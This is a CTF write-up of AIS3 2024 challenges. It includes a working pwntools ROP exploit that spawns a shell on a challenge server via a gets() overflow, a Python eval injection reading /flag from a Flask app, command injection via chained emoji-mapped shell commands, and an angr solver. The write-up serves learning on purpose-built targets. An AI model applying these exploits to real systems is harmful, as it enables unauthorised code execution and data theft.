---
title: "AIS3 mfctf & pre-exam 2024 writeup"
date: 2024-07-15
draft: false
tags: ["CTF", "AIS3", "writeup", "pwn", "reverse", "web", "misc", "angr", "rop", "2024", "competition"]
categories: ["CTF", "Competition Writeup"]
author: "YJK"
showToc: true
TocOpen: false
---

## Web

### Evil Calculator

網頁是一個簡單的計算機程式

![image](https://hackmd.io/_uploads/r1gvMt-E0.png)

透過攔截封包與 app.py 程式碼會發現他是將結果傳 POST 請求到 /calculate，並傳入 eval 做計算，所以可以傳入程式碼做解析，接下來看到 app.py 會發現傳送過去的 expression 空格跟底線都會被過濾，所以應該是不可以 import 其他東西，接下來看到 docker-compose.yml 可知 flag 在 /flag，因此直接透過開檔讀檔拿到 flag

app.py
```python
from flask import Flask, request, jsonify, render_template

app = Flask(__name__)

@app.route('/calculate', methods=['POST'])
def calculate():
    data = request.json
    expression = data['expression'].replace(" ","").replace("_","")
    try:
        result = eval(expression)
    except Exception as e:
        result = str(e)
    return jsonify(result=str(result))

@app.route('/')
def index():
    return render_template('index.html')

if __name__ == '__main__':
    app.run("0.0.0.0",5001)
```

docker-compose.yml

```yaml
services:
  evil_calc:
    build: .
    volumes:
      - ./app:/app:ro
      - ./flag:/flag:ro
    ports: 
      - "5001:5001"
```

可以用 burp 或是 python

![image](https://hackmd.io/_uploads/rJA0RxJ4C.png)

![image](https://hackmd.io/_uploads/H1glEFZVC.png)

AIS3{7RiANG13_5NAK3_I5_50_3Vi1}

## Rev

### The Long Print

先 decompile 後 (可以用 ida、ghidra、binary ninja...) 會發現他會先 sleep 很久才會 print 出 flag

![image](https://hackmd.io/_uploads/Bk4x_tWNC.png)

所以可以改 sleep 值然後 patch 接下來 export 成執行檔

先找到控制 sleep 秒數的組語然後右鍵 patch instruction

![image](https://hackmd.io/_uploads/Hy9o_KWEC.png)

![image](https://hackmd.io/_uploads/BkmstF-40.png)

![image](https://hackmd.io/_uploads/HJ3ZqY-VA.png)

format 記得要設定成 Original File

![image](https://hackmd.io/_uploads/H1B7cK-N0.png)

接下來執行程式會發現它慢慢 print 出 flag，不過他輸出完會被清掉，所以要在最後的時候按 enter 防止他被清掉

![image](https://hackmd.io/_uploads/SyxvYK-NR.png)

AIS3{You_are_the_master_of_time_management!!!!?}

### 火拳のエース

將檔案 decompile 發現他會先分配給 buffer0~3 malloc 空間，然後會先進 print_flag()，然後要輸入 4 個字串，接下來進 xor_string()，和 complex_funxtion()，把字串轉換後再做最後比對

main function
![image](https://hackmd.io/_uploads/HkGk6YW4C.png)

print_flag()
這邊會給出 flag 前墜 `AIS3{G0D`

![image](https://hackmd.io/_uploads/BksmCY-4R.png)

xor_string()

就是把字串跟傳進去的陣列做 xor

![image](https://hackmd.io/_uploads/BJR9CKZVC.png)

complex_funxtion()

將傳入的參數做一些操作，好像也可以自己逆向，不過後面我選擇用 angr 做

![image](https://hackmd.io/_uploads/HJynkcZ4C.png)

MyFirstCTF 賽後出題者說可以用 Angr 解出來，因此就看了一下 Angr

而這邊因為是用 scanf 去讀字串且空間是 malloc 出來的關係，所以我們也必須手動模擬這一部分，然後因為 xor_string() 裡面有 call 到 sscanf()，所以我將開始的點設定為全部 xor_string() 走完之後，然後再手動做完 xor_string() 的部分

```
實際程式：
buffer0 -> malloced address
Angr 模擬：
buffer0 -> malloced address -> fake heap address
```

參考資料：https://blog.csdn.net/u013648063/article/details/108831809

找 buffer0~4 的 address (可以用 ghidra、ida，但我用 nm)

![image](https://hackmd.io/_uploads/SJg0Z9-ER.png)

找到 heap 的 address (用 gdb 然後 vmmap)

![image](https://hackmd.io/_uploads/ByeVQz5ZNA.png)

傳入 xor_string() 的 array (用 ghidra 或是 ida)

![image](https://hackmd.io/_uploads/Bk7cScWNA.png)

```python
import angr
import claripy

def xor(s, key):
    return ''.join(chr(ord(a) ^ b) for a, b in zip(s, key))

def main():
    start_addr = 0x080496ED
    p = angr.Project("./rage")

    initial_state = p.factory.blank_state(addr=start_addr)
    
    length = 8

    buffer0 = claripy.BVS("buffer0", length * 8)
    buffer1 = claripy.BVS("buffer1", length * 8)
    buffer2 = claripy.BVS("buffer2", length * 8)
    buffer3 = claripy.BVS("buffer3", length * 8)
    
    buffer0_addr = 0x090fb2d4
    buffer1_addr = 0x090fb2d8
    buffer2_addr = 0x090fb2dc
    buffer3_addr = 0x090fb2e0
    fake_addr0 = 0x804d000
    fake_addr1 = 0x804d010
    fake_addr2 = 0x804d020
    fake_addr3 = 0x804d030

    initial_state.memory.store(buffer0_addr, fake_addr0, endness=p.arch.memory_endness)
    initial_state.memory.store(buffer1_addr, fake_addr1, endness=p.arch.memory_endness)
    initial_state.memory.store(buffer2_addr, fake_addr2, endness=p.arch.memory_endness)
    initial_state.memory.store(buffer3_addr, fake_addr3, endness=p.arch.memory_endness)

    initial_state.memory.store(fake_addr0, buffer0)
    initial_state.memory.store(fake_addr1, buffer1)
    initial_state.memory.store(fake_addr2, buffer2)
    initial_state.memory.store(fake_addr3, buffer3)

    simgr = p.factory.simgr(initial_state)

    success = 0x08049859
    simgr.explore(find=success)

    if simgr.found:
        solution_state = simgr.found[0]
        solution0 = solution_state.solver.eval(buffer0, cast_to=bytes)
        solution1 = solution_state.solver.eval(buffer1, cast_to=bytes)
        solution2 = solution_state.solver.eval(buffer2, cast_to=bytes)
        solution3 = solution_state.solver.eval(buffer3, cast_to=bytes)
        xorarr0 = [0x0E, 0x0D, 0x7D, 0x06, 0x0F, 0x17, 0x76, 0x04]
        xorarr1 = [0x6D, 0x00, 0x1B, 0x7C, 0x6C, 0x13, 0x62, 0x11]
        xorarr2 = [0x1E, 0x7E, 0x06, 0x13, 0x07, 0x66, 0x0E, 0x71]
        xorarr3 = [0x17, 0x14, 0x1D, 0x70, 0x79, 0x67, 0x74, 0x33]
        flag0 = xor(solution0.decode(), xorarr0)
        flag1 = xor(solution1.decode(), xorarr1)
        flag2 = xor(solution2.decode(), xorarr2)
        flag3 = xor(solution3.decode(), xorarr3)
        flag = "AIS3{G0D"+ flag0 + flag1 + flag2 + flag3
        print(flag)

if __name__ == "__main__":
    main()
```

AIS3{G0D_D4MN_4N9R_15_5UP3R_P0W3RFU1!!!}

## PWN

### Mathter

static linked 的 ROP 超基本題

static linked

![image](https://hackmd.io/_uploads/S1iMIq-EC.png)

decompile 後發現進了 calculator()

![image](https://hackmd.io/_uploads/SyqrU5WN0.png)

calculator() 基本上計算沒什麼問題及注入點，不過可以按 q 跳出 function，接下來會走到 goodbye()

![image](https://hackmd.io/_uploads/Hydxv5b4C.png)

goodbye() 會看到他使用 gets 讀輸入，因此可以輕易進行 buffer overflow 並修改 return address，並加上他沒有 PIE，所以是一題 ROP 基本題

![image](https://hackmd.io/_uploads/Hk3XDcWER.png)
![image](https://hackmd.io/_uploads/rkCdP9bV0.png)

solution:

先送 q 跳出 calculator()，接下來因為接收的字串宣告大小為 0x4，加上 save rbp 的 0x8，因此要先送 (0x4 + 0x8) 的字串，然後再串上 ROP Chain 就可以拿到 shell 了

```python
from pwn import *
context.arch = 'amd64'
#r = process('./mathter')
r = remote('chals1.ais3.org', 50001)
r.sendlineafter(b': ', b'q')
rop = flat(
    0x00000000004126a3, # pop rsi ; ret
    0x4bc000, # writable address
    0x000000000042e3a7, # pop rax ; ret
    b'/bin/sh\x00',
    0x000000000042f981, # mov qword ptr [rsi], rax ; ret
    0x000000000042e3a7, # pop rax ; ret
    0x3b, # execve
    0x0000000000402540, # pop rdi ; ret
    0x4bc000, # writable address
    0x00000000004126a3, # pop rsi ; ret
    0x0, # NULL
    0x000000000047b917, # pop rdx ; pop rbx ; ret
    0x0, # NULL
    0x0, # NULL
    0x00000000004013ea, # syscall
)
leave = b'A' * (0x4 + 0x8) + rop
r.sendlineafter(b']\n', leave)
r.interactive()
```

![image](https://hackmd.io/_uploads/SJ43dqbNR.png)

AIS3{0mg_k4zm4_mu57_b3_k1dd1ng_m3_2e89c9}

## Crypto

全都沒解

## misc

### Welcome

題目點開就有 flag 了

![image](https://hackmd.io/_uploads/BkLDljWN0.png)

AIS3{Welc0me_to_AIS3_PreExam_2o24!}

### Quantum Nim Heist

要先做一次正常輸入，讓 count 跟 pile 都被賦予值，不然會觸發 Exception error，後面可以用除了 0、1、2 以外的非正常操作讓自己跳過動作，但每次跳過 AI 都還是會做操作移除，所以等 AI 自己拿到剩下一堆時，就可以把最後一堆拿完也就獲勝並拿到 flag 了

![image](https://hackmd.io/_uploads/BJIavWZER.png)

AIS3{Ar3_y0u_a_N1m_ma57er_0r_a_Crypt0_ma57er?} 

### Emoji Console

打開網頁會發現是一個用 emoji 控制 command 的 console

![image](https://hackmd.io/_uploads/HyOEt5WEC.png)

找了一段時間發現有 🐱 跟 ⭐ 分別代表 `cat`、`*`， 可以輸出目前目錄底下所有檔案

![image](https://hackmd.io/_uploads/SypqKcWV0.png)

有輸出程式碼，裡面有各個 emoji 的對應，還有輸出以下字串

```
cat: flag: Is a directory
cat: templates: Is a directory
```

由此可知，要先進到 flag 資料夾再看

然後剛好有 💿、🚩，分別對應 cd、flag 不過接下來要截斷指令才可以開啟內容，再慢慢思考發現 😓、🤬，對應的是`;/`、`#$%&!`，串接起來會是`;/#$%&!`，正好可以用來截斷指令，再搭配前面的 🐱 跟 ⭐，可以看到以下檔案，會發現是 python 檔，用來開 flag 檔案的，所以要執行這個檔案

💿 🚩 😓🤬 🐱 ⭐：

![image](https://hackmd.io/_uploads/S1Z4T5Z4A.png)

```
#flag-printer.py

print(open('/flag','r').read())
```

🐍 對應到 python，所以可以串 🐍 ⭐ 執行所有檔案

💿 🚩 😓🤬  🐍 ⭐：

![image](https://hackmd.io/_uploads/r18zTqb4A.png)

AIS3{🫵🪡🉐🤙🤙🤙👉👉🚩👈👈}

### Three Dimensional Secret

檔案是一個封包檔，不過我直接 strings 看他，會發現很多行都是這個格式，後面查了一下這個東西叫做 gcode，好像是用在 3D 列印
![image](https://hackmd.io/_uploads/HJRSksZ4A.png)

所以將所有 `G` 前墜的資料都挑出來放到另一個檔案

`strings capture.pcapng|grep "G" > Gcode.gcode`

後面隨便找個 gcode viewer，我這邊用的是 https://gcode.ws/ ，記得切換到 3D，然後就看到 flag 了

![image](https://hackmd.io/_uploads/BJ_Vlib40.png)

AIS3{b4d1y_tun3d_PriN73r}